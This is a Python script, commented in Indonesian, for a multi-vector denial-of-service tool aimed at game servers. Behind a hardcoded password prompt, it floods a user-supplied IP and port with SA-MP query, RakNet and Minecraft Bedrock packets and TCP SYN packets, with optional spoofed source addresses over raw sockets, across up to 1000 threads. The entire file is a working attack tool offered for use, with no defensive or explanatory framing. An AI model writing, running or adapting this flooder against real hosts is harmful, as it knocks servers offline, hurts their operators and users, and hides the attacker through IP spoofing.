#!/usr/bin/env python3
import socket
import random
import threading
import time
import os
import sys
import struct
import signal

# ==================== AUTENTIKASI ====================
def login():
    os.system("clear" if os.name == "posix" else "cls")
    print("\033[36m" + "="*50)
    print("    DOS ENGINE v3.0 - ULTIMATE EDITION")
    print("    Authorized Personnel Only")
    print("="*50 + "\033[0m")
    user = input("Username : ")
    pw = input("Password : ")
    if user != "DAMAR" or pw != "DAMAR":
        print("\033[31m[!] Akses ditolak.\033[0m")
        sys.exit(1)
    print("\033[32m[+] Autentikasi berhasil. Memuat senjata...\033[0m")
    time.sleep(1)

login()

# ==================== KONFIGURASI ====================
target = input("Target IP       : ")
port = int(input("Target Port     : ") or 7777)
threads = int(input("Threads         : ") or 1000)
duration = int(input("Duration (detik): ") or 120)
spoof = input("Spoof IP? (y/n) : ").lower() == 'y'
if spoof:
    try:
        s_raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s_raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        print("[+] Raw socket aktif (IP spoofing enabled)")
    except PermissionError:
        print("[!] Raw socket butuh root. Spoofing dinonaktifkan.")
        spoof = False
        s_raw = None
else:
    s_raw = None

# ==================== PAYLOAD GENERATOR ====================
def random_ip():
    return ".".join(str(random.randint(1,254)) for _ in range(4))

def random_port():
    return random.randint(1024, 65535)

# SAMP Query (efektif untuk memicu query handler)
def build_samp_packet(src_ip=None):
    ip_parts = [int(x) for x in target.split('.')]
    samp_header = b'SAMP' + bytes(ip_parts) + struct.pack('<H', port) + b'i'
    if spoof and src_ip:
        # IP header minimal untuk raw socket
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                0x45, 0, 40+len(samp_header), 0, 64, 0, 255, 0,
                                socket.inet_aton(src_ip),
                                socket.inet_aton(target))
        return ip_header + samp_header
    return samp_header

# RakNet Payload dengan variasi besar
raknet_magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
raknet_templates = [
    b'\x01' + random.randbytes(30),          # Unconnected Ping
    b'\x05' + raknet_magic + random.randbytes(20),  # Open Connection Request 1
    b'\x07' + random.randbytes(50),          # Connection Request
    b'\x08' + random.randbytes(60),          # Connection Request Accepted
    b'\x00' * 512,                           # Null flood besar
]

def build_raknet_packet(src_ip=None):
    base = random.choice(raknet_templates)
    # Duplikasi untuk memperbesar ukuran paket
    mult = random.randint(8, 30)
    payload = base * mult
    # Tambah padding acak
    payload += random.randbytes(random.randint(256, 1024))
    if spoof and src_ip:
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                0x45, 0, len(payload)+20, 0, 64, 0, 255, 0,
                                socket.inet_aton(src_ip),
                                socket.inet_aton(target))
        return ip_header + payload
    return payload

# Minecraft Bedrock specific (RakNet Open Connection Request 1 dengan magic valid)
def build_bedrock_packet(src_ip=None):
    # Open Connection Request 1
    payload = b'\x05' + raknet_magic + random.randbytes(16)
    # Tambah payload besar
    payload += random.randbytes(random.randint(500, 1500))
    if spoof and src_ip:
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                0x45, 0, len(payload)+20, 0, 64, 0, 255, 0,
                                socket.inet_aton(src_ip),
                                socket.inet_aton(target))
        return ip_header + payload
    return payload

# TCP SYN flood untuk port lain (opsional jika ingin lebih brutal)
def build_syn_packet(src_ip, src_port, dst_port):
    # IP header
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            0x45, 0, 40, 0, 64, 0, 255, 6,
                            socket.inet_aton(src_ip),
                            socket.inet_aton(target))
    # TCP header dengan flag SYN
    tcp_header = struct.pack('!HHLLBBHHH',
                             src_port, dst_port, 0, 0, 5<<4, 2, 8192, 0, 0)
    return ip_header + tcp_header

# ==================== FLOOD FUNCTIONS ====================
# Setiap thread akan menjalankan semua jenis flood secara round-robin
def flood_worker(thread_id):
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Bind ke port acak agar tidak terdeteksi
    udp_sock.bind(('0.0.0.0', random.randint(10000, 65000)))
    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    end = time.time() + duration
    while time.time() < end:
        try:
            # Paket SAMP
            if spoof and s_raw:
                src_ip = random_ip()
                packet = build_samp_packet(src_ip)
                s_raw.sendto(packet, (target, 0))
            else:
                udp_sock.sendto(build_samp_packet(), (target, port))

            # RakNet payload
            if spoof and s_raw:
                packet = build_raknet_packet(random_ip())
                s_raw.sendto(packet, (target, 0))
            else:
                udp_sock.sendto(build_raknet_packet(), (target, port))

            # Bedrock khusus jika port Minecraft
            if port in (19132, 19133):
                if spoof and s_raw:
                    packet = build_bedrock_packet(random_ip())
                    s_raw.sendto(packet, (target, 0))
                else:
                    udp_sock.sendto(build_bedrock_packet(), (target, port))

            # TCP SYN flood ke port target (opsional, bisa aktif selalu)
            if spoof and s_raw:
                src_ip = random_ip()
                src_port = random.randint(1024, 65535)
                syn_packet = build_syn_packet(src_ip, src_port, port)
                s_raw.sendto(syn_packet, (target, 0))
            else:
                # Mode non-spoof: kirim koneksi SYN biasa
                tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_sock.settimeout(0.001)
                try:
                    tcp_sock.connect((target, port))
                    tcp_sock.close()
                except:
                    pass

        except:
            pass

# ==================== MAIN ====================
print(f"\033[31mMenyerang {target}:{port} dengan mode:\033[0m")
print("  - SAMP Query Flood (max size)")
print("  - RakNet Payload Flood (variatif + rekursif)")
if port in (19132, 19133):
    print("  - Minecraft Bedrock Open Connection Flood")
print("  - TCP SYN Flood (spoofed)" if spoof else "  - TCP SYN Flood (normal)")
print(f"\n[+] Memulai {threads} thread selama {duration} detik...\n")

thread_list = []
for i in range(threads):
    t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
    t.start()
    thread_list.append(t)
    time.sleep(0.0005)  # stagger ringan agar tidak overload CPU

# Tunggu hingga durasi habis
try:
    time.sleep(duration + 2)
except KeyboardInterrupt:
    print("\n\033[31m[!] Serangan dihentikan manual.\033[0m")
finally:
    print("\033[31m[+] Serangan selesai.\033[0m")
